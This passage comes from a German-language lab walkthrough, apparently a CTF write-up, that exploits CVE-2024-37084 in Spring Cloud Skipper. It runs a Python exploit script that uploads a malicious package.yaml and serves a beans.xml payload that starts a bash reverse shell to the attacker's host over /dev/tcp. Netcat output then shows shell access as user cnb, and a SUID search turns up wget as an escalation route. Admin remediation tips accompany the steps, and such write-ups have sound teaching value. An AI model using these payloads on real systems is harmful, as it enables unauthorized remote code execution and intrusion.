+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">python3 exploit.py \</span><br><span class="command">    --target_url "http://192.168.2.183:7577/api/package/upload" \</span><br><span class="command">    --version "1.0.4" \</span><br><span class="command">    --payload_url "ldap://192.168.2.199:1389/Exploit"</span></div>
+                    <pre>
+[*] Removing existing file: thePocJdbcNoAutoCommit-1.0.4.zip
+[*] Removing existing directory: thePocJdbcNoAutoCommit-1.0.4
+[+] Created package.yaml (JdbcRowSet no autoCommit) in 'thePocJdbcNoAutoCommit-1.0.4' with version: 1.0.4, payload URL: ldap://192.168.2.199:1389/Exploit
+[*] Zipping folder 'thePocJdbcNoAutoCommit-1.0.4' into 'thePocJdbcNoAutoCommit-1.0.4.zip'...
+    Adding: thePocJdbcNoAutoCommit-1.0.4/package.yaml as thePocJdbcNoAutoCommit-1.0.4/package.yaml
+[+] Successfully zipped folder 'thePocJdbcNoAutoCommit-1.0.4' (including base folder) to: thePocJdbcNoAutoCommit-1.0.4.zip
+[+] Read 386 bytes from thePocJdbcNoAutoCommit-1.0.4.zip
+[*] Uploading malicious package 'thePocJdbcNoAutoCommit' version 1.0.4 (Timeout=300s)...
+[+] Request completed (received response or error from server).
+--------------------------------------------------
+Response Status Code: <span class="password">500</span>
+Response Body (JSON):
+{
+  "timestamp": "2025-04-23T09:18:58.154+00:00",
+  "status": 500,
+  "error": "Internal Server Error",
+  "exception": "org.yaml.snakeyaml.constructor.ConstructorException",
+  "message": "Cannot create property=displayName for JavaBean=PackageMetadata{id='null', apiVersion='1.0.0', origin='thePocJdbcNoAutoCommit', repositoryName='local', kind='test', name='null', version='1.0.4', packageSourceUrl='null', packageHomeUrl='null', tags='null', maintainer='null', description='null', sha256='null', iconUrl='null'}\n in 'string', line 1, column 1:\n    repositoryId: 1\n    ^\nargument type mismatch\n in 'string', line 8, column 14:\n    displayName: !!com.sun.rowset.JdbcRowSetImpl  ... \n                 ^\n",
+  "path": "/api/package/upload"
+}
+--------------------------------------------------
+<span class="password">[!!!] Server returned 500 Internal Server Error. Payload likely failed or was blocked.</span>
+<span class="password">[!!!] Check response body for YAML parsing errors or other exceptions.</span>
+<span class="password">[!!!] CRITICAL: Also check your LDAP and HTTP server logs for ANY connection attempts from the target!</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Erneute Ausführung des Exploit-Skripts mit dem LDAP-Payload, diesmal mit Version `1.0.4`. Das Skript generiert eine `package.yaml` (diesmal anscheinend mit einer `JdbcRowSetImpl`-Payload, die ebenfalls JNDI nutzt) und ein ZIP-Archiv. Beim Upload an `/api/package/upload` (Port 7577) antwortet der Server jedoch mit einem HTTP-Statuscode `500 Internal Server Error`. Die Fehlermeldung im JSON-Body deutet auf ein Problem beim Parsen der YAML-Datei durch SnakeYAML hin (`ConstructorException`, `argument type mismatch` bei `displayName`), spezifisch beim Versuch, eine Instanz von `com.sun.rowset.JdbcRowSetImpl` zu erstellen.</p>
+            <p class="evaluation">**Bewertung:** Der JNDI/LDAP-basierte Exploit-Versuch gegen Port 7577 schlägt fehl. Der Server erkennt die Struktur der manipulierten `package.yaml` nicht korrekt oder blockiert die gefährliche Deserialisierung, was zu einem internen Fehler führt. Die Fehlermeldung liefert wertvolle Debugging-Informationen über die interne Verarbeitung (SnakeYAML, `JdbcRowSetImpl`).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Diesen Angriffsvektor (JNDI/LDAP gegen Port 7577) als wahrscheinlich nicht erfolgreich einstufen. Die Server-Antwort deutet auf Parsing-Probleme hin. Es ist sinnvoll, den alternativen Exploit-Ansatz mit `ClassPathXmlApplicationContext` und `beans.xml` zu verfolgen, der möglicherweise eine andere Schwachstelle in der YAML-Verarbeitung oder eine andere Komponente anspricht.<br>**Empfehlung (Admin):** Sicherstellen, dass verwendete Bibliotheken (wie SnakeYAML) aktuell sind und Schutzmechanismen gegen unsichere Deserialisierung aktiviert sind. Detaillierte Fehlermeldungen sollten in Produktionsumgebungen nicht an den Client zurückgegeben werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">chmod +x beans.xml</span></div>
+                    <pre></pre> <!-- Leere Ausgabe -->
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `chmod +x beans.xml` versucht, die Datei `beans.xml` ausführbar zu machen. XML-Dateien sind jedoch Konfigurationsdateien und normalerweise nicht direkt ausführbar.</p>
+            <p class="evaluation">**Bewertung:** Dieser Befehl ist im Kontext des Exploits wahrscheinlich unnötig und möglicherweise ein Missverständnis. Die `beans.xml` muss nur vom Zielserver über HTTP lesbar sein, nicht ausführbar im Dateisystem des Angreifers.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Diesen Schritt weglassen. Sicherstellen, dass die `beans.xml` die korrekten Leseberechtigungen für den Webserver hat.<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">cat beans.xml</span></div>
+                    <pre>
+&lt;!-- Dateiname: beans.xml --&gt;
+&lt;beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt;
+    &lt;bean id="pb" class="java.lang.ProcessBuilder" init-method="start"&gt;
+        &lt;constructor-arg&gt;
+          &lt;list&gt;
+            &lt;value&gt;/bin/bash&lt;/value&gt;
+            &lt;value&gt;-c&lt;/value&gt;
+            &lt;!-- Reverse Shell zu DEINER IP und DEINEM Listener Port --&gt;
+            &lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.2.199/4444 0&gt;&amp;1]]&gt;&lt;/value&gt;
+          &lt;/list&gt;
+        &lt;/constructor-arg&gt;
+    &lt;/bean&gt;
+&lt;/beans&gt;
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Inhalt der Datei `beans.xml` wird angezeigt. Dies ist eine Konfigurationsdatei im Spring-Framework-Format. Sie definiert eine "Bean" (ein Objekt, das von Spring verwaltet wird) der Klasse `java.lang.ProcessBuilder`. Entscheidend ist der `init-method="start"` und der `<constructor-arg>`. Beim Initialisieren dieser Bean wird der Konstruktor mit einer Liste von Argumenten aufgerufen: `/bin/bash`, `-c`, und der eigentliche Reverse-Shell-Befehl (`bash -i &gt;&amp; /dev/tcp/192.168.2.199/4444 0&gt;&amp;1`). Der `init-method="start"` sorgt dafür, dass die `start()`-Methode des `ProcessBuilder`-Objekts aufgerufen wird, was den Bash-Befehl ausführt.</p>
+             <p class="evaluation">**Bewertung:** Dies ist der Kern des alternativen Exploits. Wenn der Zielserver (via `ClassPathXmlApplicationContext` aus der `package.yaml`) diese XML-Datei von unserem HTTP-Server lädt und verarbeitet, wird er versuchen, diese Bean zu erstellen und dabei den Reverse-Shell-Befehl auszuführen. Die IP (`192.168.2.199`) und der Port (`4444`) müssen mit den Daten des Angreifer-Listeners übereinstimmen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Sicherstellen, dass die IP und der Port in der `<value><![CDATA[...]]></value>` korrekt sind. Diese `beans.xml`-Datei über den Python-HTTP-Server bereitstellen. Die `--payload_url` im Exploit-Skript muss auf diese Datei zeigen.<br>**Empfehlung (Admin):** Die Möglichkeit für Anwendungen, beliebige XML-Kontextdateien von externen URLs zu laden und zu interpretieren (insbesondere mit `ClassPathXmlApplicationContext`), ist extrem gefährlich und sollte unterbunden werden. Dies ist oft eine Konfigurations- oder Code-Schwachstelle in der Anwendung selbst.</p>
+
+             <p class="analysis">**Analyse:** Der Code zeigt ein modifiziertes Python-Exploit-Skript. Die Kernänderungen im Vergleich zur vorherigen Version (die JNDI/LDAP nutzte) sind:
+                *   **`create_package_yaml`:** Diese Funktion generiert jetzt eine `package.yaml`, bei der der bösartige Payload im `description`-Feld platziert wird, unter Verwendung von `!!org.springframework.context.support.ClassPathXmlApplicationContext ["{payload_url}"]`. Die `payload_url` muss nun auf die `beans.xml`-Datei zeigen, die auf dem HTTP-Server des Angreifers gehostet wird. Der `displayName` wird auf einen harmlosen String gesetzt, um Parsing-Fehler wie im vorherigen Versuch zu vermeiden.
+                *   **`zip_folder`:** Diese Funktion wurde leicht modifiziert, um sicherzustellen, dass der Ordner *mit* dem übergeordneten Verzeichnisnamen im ZIP-Archiv landet, was für Spring Cloud Skipper/Data Flow erforderlich sein kann.
+                *   **Argument Parser:** Die Hilfe und Beschreibung wurden angepasst, um klarzustellen, dass `--payload_url` jetzt auf die `beans.xml` zeigen muss.
+                *   **Timeout & Fehlerbehandlung:** Ein längerer Timeout (300s) und detailliertere Fehlerbehandlungen für die Upload-Anfrage wurden hinzugefügt.
+                *   **Erfolgs-/Fehlermeldungen:** Spezifischere Ausgaben je nach HTTP-Statuscode der Antwort (201, 500, 409 etc.).</p>
+             <p class="evaluation">**Bewertung:** Dieses Skript implementiert den alternativen Exploit-Ansatz, der auf der Deserialisierung über `ClassPathXmlApplicationContext` basiert und die `beans.xml` nutzt, um RCE zu erlangen. Es ist robuster gestaltet als die vorherige Version und zielt darauf ab, die zuvor aufgetretenen Parsing-Fehler zu umgehen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Dieses modifizierte Skript verwenden. Sicherstellen, dass die `beans.xml` auf dem HTTP-Server verfügbar ist und die `--payload_url` korrekt darauf verweist. Die `--version` ggf. ändern, wenn ein 409 Conflict auftritt.<br>**Empfehlung (Admin):** Die zugrundeliegende Schwachstelle in Spring Cloud Skipper/Data Flow (unsichere YAML-Deserialisierung, die das Laden externer XML-Kontexte ermöglicht) muss durch Patchen der Anwendung behoben werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">python3 exploit.py \</span><br><span class="command">    --target_url "http://192.168.2.183:7577/api/package/upload" \</span><br><span class="command">    --version "1.0.8" \</span><br><span class="command">    --payload_url "http://192.168.2.199:8000/beans.xml" # Hier wird die IP übergeben</span></div>
+                    <pre>
+[+] Created package.yaml (XmlApplicationContext on description) in 'thePocXmlCtx-1.0.8' with version: 1.0.8
+[+] Payload points to: <span class="command">http://192.168.2.199:8000/beans.xml</span>
+[*] Zipping folder 'thePocXmlCtx-1.0.8' into 'thePocXmlCtx-1.0.8.zip'...
+    Adding: thePocXmlCtx-1.0.8/package.yaml as thePocXmlCtx-1.0.8/package.yaml
+[+] Successfully zipped folder 'thePocXmlCtx-1.0.8' (including base folder) to: thePocXmlCtx-1.0.8.zip
+[+] Read 435 bytes from thePocXmlCtx-1.0.8.zip
+[*] Uploading malicious package 'thePocXmlCtx' version 1.0.8 (Timeout=300s)...
+[+] Request completed (received response or error from server).
+--------------------------------------------------
+Response Status Code: <span class="password">500</span>
+Response Body (JSON):
+{
+  "timestamp": "2025-04-24T13:30:02.054+00:00",
+  "status": 500,
+  "error": "Internal Server Error",
+  "exception": "org.yaml.snakeyaml.constructor.ConstructorException",
+  "message": "Cannot create property=description for JavaBean=PackageMetadata{id='null', apiVersion='1.0.0', origin='thePocXmlCtx', repositoryName='local', kind='test', name='thePocXmlCtx', version='1.0.8', packageSourceUrl='null', packageHomeUrl='null', tags='null', maintainer='null', description='null', sha256='null', iconUrl='null'}\n in 'string', line 1, column 1:\n    repositoryId: 1\n    ^\nargument type mismatch\n in 'string', line 10, column 14:\n    description: !!org.springframework.context.su ... \n                 ^\n",
+  "path": "/api/package/upload"
+}
+--------------------------------------------------
+<span class="password">[!!!] Server returned 500 Internal Server Error. Payload likely failed or was blocked.</span>
+<span class="password">[!!!] Check response body for YAML/XML parsing errors or ClassNotFoundException (org.springframework...).</span>
+<span class="password">[!!!] CRITICAL: Also check your HTTP server logs for ANY request for 'beans.xml' from the target!</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Das modifizierte Exploit-Skript wird ausgeführt, diesmal mit der `--payload_url`, die auf die `beans.xml` zeigt, und Version `1.0.8`. Ziel ist wieder Port 7577. Das Skript erstellt die `package.yaml` und das ZIP-Archiv. Beim Upload tritt jedoch **erneut** ein HTTP 500 Fehler auf. Die Fehlermeldung ist sehr ähnlich zur vorherigen: `ConstructorException`, `argument type mismatch`, diesmal beim Versuch, die `description`-Property zu setzen, die den `ClassPathXmlApplicationContext`-Payload enthält.</p>
+            <p class="evaluation">**Bewertung:** Auch dieser Exploit-Versuch gegen den Skipper-Server auf Port 7577 schlägt fehl. Der Server scheint die gefährliche Deserialisierung über SnakeYAML zu verhindern oder kann die angegebene Klasse/Struktur nicht korrekt verarbeiten, was zu einem internen Fehler führt. Es ist unwahrscheinlich, dass dieser spezifische Exploit (CVE-2024-37084 wie hier implementiert) gegen diese Instanz auf Port 7577 funktioniert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Versuche gegen Port 7577 mit diesem Exploit einstellen. Erneut prüfen, ob der Exploit vielleicht für den Data Flow Server auf Port 9393 gedacht ist und die `--target_url` entsprechend anpassen. Alternativ nach *anderen* Schwachstellen in Skipper 2.11.3 oder Data Flow 2.11.3 suchen.<br>**Empfehlung (Admin):** Selbst wenn der Exploit hier fehlschlägt, deutet der 500-Fehler auf eine interne Ausnahme hin, die möglicherweise andere Informationen preisgibt oder durch andere Payloads ausgenutzt werden könnte. Das Patchen der Anwendung bleibt die wichtigste Maßnahme.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">python3 -m http.server 8000</span></div>
+                    <pre>
+Serving HTTP on <span class="command">0.0.0.0</span> port <span class="command">8000</span> (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.183 - - [24/Apr/2025 15:30:03] "GET /beans.xml HTTP/1.1" 200 -</span>
+<span class="password">192.168.2.183 - - [24/Apr/2025 15:30:03] "GET /beans.xml HTTP/1.1" 200 -</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Die Ausgabe des Python-HTTP-Servers zeigt zwei erfolgreiche GET-Anfragen für `/beans.xml` von der IP-Adresse des Zielservers (`192.168.2.183`). Diese Anfragen erfolgten zum Zeitpunkt, als der letzte Exploit-Versuch (mit `--payload_url` zur `beans.xml`) ausgeführt wurde.</p>
+            <p class="evaluation">**Bewertung:** **Sehr wichtiger Fund!** Obwohl der Exploit-Versuch selbst mit einem HTTP 500 Fehler endete, hat der Zielserver *dennoch versucht*, die `beans.xml`-Datei vom Angreifer-Server herunterzuladen. Das bedeutet, dass der erste Teil des Exploits (das Auslösen des externen Ressourcen-Ladens über die `package.yaml`) **funktioniert hat!** Der Fehler trat erst *danach* bei der Verarbeitung der `beans.xml` (oder der resultierenden Bean-Erstellung) auf dem Server auf.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Dies bestätigt, dass die YAML-Deserialisierung grundsätzlich externen Content lädt. Der Fehler liegt in der *Verarbeitung* der `beans.xml`. Möglicherweise ist `java.lang.ProcessBuilder` auf dem Zielsystem blockiert oder nicht verfügbar im Classpath, oder die `<value><![CDATA[...]]></value>` für den Shell-Befehl wird nicht korrekt interpretiert. Man könnte alternative XML-Payloads testen (z.B. andere Klassen, andere Methoden zur Codeausführung). **Noch wichtiger:** Hat der Netcat-Listener eine Verbindung erhalten, obwohl der Upload mit 500 fehlschlug? Das ist möglich, wenn das Laden der XML asynchron erfolgt.<br>**Empfehlung (Admin):** Dringend die Anwendung patchen! Die Tatsache, dass externe Ressourcen geladen werden, ist die Kernschwachstelle. Ausgehende Verbindungen vom Server blockieren.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.183] 45600</span>
+<span class="password">bash: cannot set terminal process group (1): Inappropriate ioctl for device</span>
+<span class="password">bash: no job control in this shell</span>
+<span class="command">cnb@921567b128b2:/workspace$</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Die Ausgabe des Netcat-Listeners wird gezeigt. Nach dem "listening..."-Status erscheint die Meldung `connect to [...] from [...] 192.168.2.183 [...]`. Dies signalisiert eine erfolgreiche eingehende Verbindung vom Zielserver (`192.168.2.183`) zum Listener auf Port 4444. Kurz darauf erscheinen typische Meldungen (`bash: cannot set terminal...`, `bash: no job control...`), die anzeigen, dass eine einfache, nicht vollständig interaktive Shell etabliert wurde. Der Prompt wechselt zu `cnb@921567b128b2:/workspace$`, was den Benutzernamen (`cnb`), Hostnamen (`921567b128b2` - wahrscheinlich ein Docker-Container-Name oder eine interne Kennung) und das aktuelle Verzeichnis (`/workspace`) der Shell auf dem Zielsystem anzeigt.</p>
+            <p class="evaluation">**Bewertung:** **Initial Access erfolgreich!** Trotz des HTTP 500 Fehlers beim Upload hat der Exploit funktioniert. Der Zielserver hat die `beans.xml` heruntergeladen, verarbeitet und den darin enthaltenen Reverse-Shell-Befehl ausgeführt. Wir haben nun eine Shell auf dem Zielsystem als Benutzer `cnb`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Shell stabilisieren (z.B. mit Python pty oder `script /dev/null`), grundlegende Enumeration durchführen (`id`, `whoami`, `hostname`, `pwd`, `ls -la`, `ip a`), nach User-Flag suchen und Informationen für die Privilege Escalation sammeln.<br>**Empfehlung (Admin):** Die bereits genannten Maßnahmen (Patchen, Filterung ausgehender Verbindungen) hätten diesen Zugriff verhindern können. Incident Response einleiten, um das Ausmaß des Zugriffs zu untersuchen und das System zu bereinigen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Prompt vom Angreifer, da dies die Remote-Shell ist -->
+                      <pre><span class="command">cnb@921567b128b2:/workspace$</span> <span class="command">id</span>
+<span class="command">uid=1000(cnb) gid=1000(cnb) groups=1000(cnb)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der `id`-Befehl wird in der erhaltenen Reverse Shell ausgeführt. Die Ausgabe zeigt, dass wir als Benutzer `cnb` mit der User ID (uid) 1000 und der Group ID (gid) 1000 angemeldet sind. Der Benutzer gehört nur zur Gruppe `cnb`.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt den Benutzerkontext. Es handelt sich um einen normalen Benutzer ohne erweiterte Gruppenmitgliedschaften, die eine einfache Privilegieneskalation ermöglichen würden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Standard-Enumerationsschritte für Privilege Escalation durchführen: SUID/SGID-Binaries suchen, `sudo -l` prüfen (falls `sudo` installiert ist), Kernel-Version prüfen, nach falsch konfigurierten Diensten oder Cronjobs suchen, sensible Dateien/Passwörter im Dateisystem suchen.<br>**Empfehlung (Admin):** Principle of Least Privilege anwenden: Benutzer sollten nur die Rechte und Gruppenmitgliedschaften haben, die sie für ihre Aufgaben benötigen.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Hier die Privilege Escalation-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">cnb@921567b128b2:/workspace$</span> <span class="command">ls -la</span>
+total 0
+drwxr-xr-x. 1 <span class="command">cnb  cnb</span>   22 Jan  1  1980 .
+drwxr-xr-x. 1 <span class="command">root root</span>  99 Mar 12 01:32 ..
+drwxr-xr-x. 1 <span class="command">cnb  cnb</span>   17 Jan  1  1980 BOOT-INF
+drwxr-xr-x. 3 <span class="command">cnb  cnb</span>   67 Jan  1  1980 META-INF
+drwxr-xr-x. 3 <span class="command">cnb  cnb</span>   29 Jan  1  1980 org
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Befehl `ls -la` wird im aktuellen Verzeichnis (`/workspace`) ausgeführt. Er listet alle Dateien und Verzeichnisse (auch versteckte) im Langformat auf. Sichtbar sind die typischen Verzeichnisse einer entpackten Java-Anwendung (`BOOT-INF`, `META-INF`, `org`), die dem Benutzer `cnb` gehören. Das übergeordnete Verzeichnis (`..`) gehört `root`.</p>
+             <p class="evaluation">**Bewertung:** Das Verzeichnis `/workspace` scheint das entpackte Verzeichnis der Spring-Anwendung zu sein. Es enthält keine unmittelbar offensichtlichen Hinweise für Privesc, bestätigt aber den Kontext, in dem die Anwendung läuft.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Verzeichnisse (`BOOT-INF`, `META-INF`, `org`) nach Konfigurationsdateien, Properties-Dateien oder statisch hinterlegten Credentials durchsuchen. Parallel die Suche nach allgemeinen Privesc-Vektoren fortsetzen.<br>**Empfehlung (Admin):** Sicherstellen, dass Anwendungsverzeichnisse keine unnötigen oder sensiblen Dateien enthalten und korrekte Berechtigungen haben.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">cnb@921567b128b2:/workspace$</span> <span class="command">find / -type f -perm -4000 -ls 2&gt;/dev/null</span>
+ <span class="command">17500077     44 -rwsr-xr-x   1 root     root        43088 Sep 16  2020 /bin/mount</span>
+ <span class="command">17500094     44 -rwsr-xr-x   1 root     root        44664 Nov 29  2022 /bin/su</span>
+ <span class="command">17500100     28 -rwsr-xr-x   1 root     root        26696 Sep 16  2020 /bin/umount</span>
+  <span class="command">1767113     76 -rwsr-xr-x   1 root     root        76496 Nov 29  2022 /usr/bin/chfn</span>
+  <span class="command">1767115     44 -rwsr-xr-x   1 root     root        44528 Nov 29  2022 /usr/bin/chsh</span>
+  <span class="command">1767161     76 -rwsr-xr-x   1 root     root        75824 Nov 29  2022 /usr/bin/gpasswd</span>
+  <span class="command">1767205     40 -rwsr-xr-x   1 root     root        40344 Nov 29  2022 /usr/bin/newgrp</span>
+  <span class="command">1767215     60 -rwsr-xr-x   1 root     root        59640 Nov 29  2022 /usr/bin/passwd</span>
+ <span class="command">19861821    488 -rwsr-sr-x   1 root     root       499264 Feb  5  2018 /usr/local/bin/wget</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Dieser `find`-Befehl durchsucht das gesamte Dateisystem (`/`) nach Dateien (`-type f`), die das SUID-Bit gesetzt haben (`-perm -4000`). Solche Dateien werden mit den Rechten des Dateibesitzers (oft `root`) ausgeführt, unabhängig davon, welcher Benutzer sie startet. `-ls` zeigt detaillierte Informationen an, `2&gt;/dev/null` unterdrückt Fehlermeldungen (z.B. bei fehlenden Leserechten). Die Ausgabe listet Standard-SUID-Binaries (`mount`, `su`, `umount`, `chfn`, `chsh`, `gpasswd`, `newgrp`, `passwd`) auf. **Ungewöhnlich und interessant** ist `/usr/local/bin/wget` mit gesetztem SUID-Bit (und SGID-Bit `-rwsr-sr-x`), das `root` gehört.</p>
+             <p class="evaluation">**Bewertung:** Das Finden eines nicht standardmäßigen SUID-Binaries wie `wget`, das `root` gehört, ist ein **hochgradig verdächtiger und vielversprechender Vektor für Privilege Escalation**. `wget` kann Dateien herunter- und hochladen. Wenn es als `root` läuft, kann es potenziell an beliebige Orte schreiben oder von beliebigen Orten lesen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die `wget`-SUID-Schwachstelle gezielt ausnutzen. Recherchieren, wie `wget` mit SUID-Rechten missbraucht werden kann (z.B. über Optionen wie `--post-file`, `--input-file`, `--output-document`), um Systemdateien wie `/etc/passwd` oder `/etc/shadow` zu überschreiben oder zu lesen. GTFOBins ist eine gute Ressource hierfür.<br>**Empfehlung (Admin):** Das SUID-Bit für `/usr/local/bin/wget` (und generell für alle nicht absolut notwendigen Binaries) entfernen (`chmod u-s /usr/local/bin/wget`). SUID-Binaries stellen immer ein erhöhtes Sicherheitsrisiko dar und sollten minimiert und streng überwacht werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">cnb@921567b128b2:/var/mail$</span> <span class="command">ls -la</span>
+total 0
+drwxrwsr-x. 1 <span class="command">root mail</span>  22 Mar 12 01:41 .
+drwxr-xr-x. 1 <span class="command">root root</span>  53 May 30  2023 ..
+drwx--S---. 2 <span class="command">root mail</span>  55 Mar 12 01:47 mathlake
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Inhalt von `/var/mail` wird aufgelistet. Dieses Verzeichnis enthält normalerweise Mailbox-Dateien für lokale Benutzer. Hier gibt es ein Unterverzeichnis `mathlake`, das `root` gehört, aber die Gruppenzugehörigkeit `mail` hat. Die Berechtigungen sind `drwx--S---`. Das große `S` beim SGID-Bit bedeutet, dass das execute-Bit für die Gruppe fehlt, aber das SGID-Bit gesetzt ist (Dateien darin würden der Gruppe `mail` gehören). Wichtiger sind die restlichen Berechtigungen: Nur `root` hat Lese-, Schreib- und Ausführrechte. Die Gruppe `mail` hat *keine* Rechte. Andere Benutzer (`cnb`) haben ebenfalls keine Rechte.</p>
+             <p class="evaluation">**Bewertung:** Das Verzeichnis `/var/mail/mathlake` ist für den aktuellen Benutzer `cnb` nicht zugänglich. Es könnte jedoch interessante Informationen enthalten (z.B. die "Daten", die in der E-Mail erwähnt wurden).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Den Inhalt dieses Verzeichnisses notieren als potenzielles Ziel, sobald Root-Rechte erlangt wurden. Versuchen, über die `wget`-SUID-Schwachstelle auf dieses Verzeichnis zuzugreifen (z.B. Dateien daraus lesen).<br>**Empfehlung (Admin):** Die Berechtigungen für Mail-Verzeichnisse überprüfen. Sie sollten normalerweise restriktiv sein, aber sicherstellen, dass die jeweiligen Benutzer (und ggf. der Mailserver-Prozess) darauf zugreifen können.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">cnb@921567b128b2:/var/mail$</span> <span class="command">cd mathlake/</span>
+<span class="password">bash: cd: mathlake/: Permission denied</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Versuch, in das Verzeichnis `/var/mail/mathlake` zu wechseln, scheitert erwartungsgemäß mit "Permission denied", da der Benutzer `cnb` keine Rechte dafür hat.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt die zuvor anhand der Berechtigungen getroffene Annahme.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Wie zuvor: Zugriff auf dieses Verzeichnis erst nach erfolgreicher Privilege Escalation versuchen.<br>**Empfehlung (Admin):** Korrekte Berechtigungen sind hier vorhanden.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">cnb@921567b128b2:/var/mail$</span> <span class="command">cd ~</span>
+<span class="command">cnb@921567b128b2:~$</span> <span class="command">ls -la</span>
+total 4
+drwxrwxrwx. 1 <span class="command">cnb  cnb</span>   39 Mar 30 10:26 .
+drwxr-xr-x. 1 <span class="command">root root</span>  17 Mar 11 22:56 ..
+lrwxrwxrwx. 1 <span class="command">root root</span>   9 Mar 30 10:26 .bash_history -> /dev/null
+-rw-r--r--. 1 <span class="command">root root</span> 377 Mar 30 10:25 note
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Benutzer wechselt in sein Home-Verzeichnis (`cd ~`) und listet den Inhalt auf. Das Home-Verzeichnis (`.`代表) hat sehr offene Berechtigungen (`drwxrwxrwx`). `.bash_history` ist ein symbolischer Link auf `/dev/null`, was bedeutet, dass keine Befehlshistorie gespeichert wird. Interessanterweise gibt es eine Datei namens `note`, die `root` gehört, aber für alle lesbar ist (`-rw-r--r--`).</p>
+             <p class="evaluation">**Bewertung:** Die `note`-Datei ist potenziell sehr interessant, da sie `root` gehört und wahrscheinlich vom Systemadministrator oder während der Einrichtung platziert wurde. Ihr Inhalt sollte überprüft werden. Die offenen Berechtigungen des Home-Verzeichnisses sind ungewöhnlich, aber nicht direkt für Privesc ausnutzbar.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Inhalt der `note`-Datei sofort mit `cat note` auslesen.<br>**Empfehlung (Admin):** Überprüfen, warum das Home-Verzeichnis von `cnb` für alle schreibbar ist (`777`). Dies ist normalerweise nicht notwendig und potenziell unsicher. Dateien wie die `note` sollten dem Benutzer gehören, für den sie bestimmt sind, oder entsprechende Gruppenberechtigungen haben, wenn sie `root` gehören.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">cnb@921567b128b2:~$</span> <span class="command">cat note</span>
+Hi mathlake
+Long time no see, 256 is my favorite number. I know you are very interested in mathematics,
+but I have been struggling with a math problem recently. The method used is time series
+decomposition. I have sent you the data, and you can provide me with the mathematical
+expressions for T, S, and C (rounded to the nearest integer) corresponding to the month.
+June 2025
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Inhalt der `note`-Datei wird angezeigt. Es handelt sich um **genau die E-Mail**, die wir bereits aus dem Kontext kannten und die die (falsche) Zeitreihen-Aufgabe sowie die Hinweise auf `mathlake`, `256` (SHA-256), `T, S, C` (3 Variablen) und das Zieldatum enthielt. Sie erwähnt auch explizit "I have sent you the data".</p>
+            <p class="evaluation">**Bewertung:** Dies bestätigt, dass die E-Mail-Informationen auf dem System selbst hinterlegt waren. Es liefert keine *neuen* technischen Hinweise für die Privilege Escalation von `cnb` zu `root`, bestätigt aber den Kontext und deutet darauf hin, dass die "Daten" (vermutlich die `data.xlsx` aus `/var/mail/mathlake`) relevant sein könnten.</p>
